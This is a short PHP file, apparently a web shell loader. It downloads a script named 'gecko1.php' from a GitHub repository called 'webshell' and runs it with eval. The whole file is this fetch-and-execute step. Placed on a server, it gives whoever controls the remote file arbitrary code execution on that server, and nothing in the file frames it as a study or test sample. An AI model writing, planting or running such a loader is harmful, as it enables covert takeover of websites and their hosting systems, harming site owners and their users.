<?php $LanThau = file_get_contents(urldecode('https://raw.githubusercontent.com/imous007/webshell/refs/heads/main/gecko1.php'));

$LanThau = "?> ".$LanThau;
eval($LanThau);
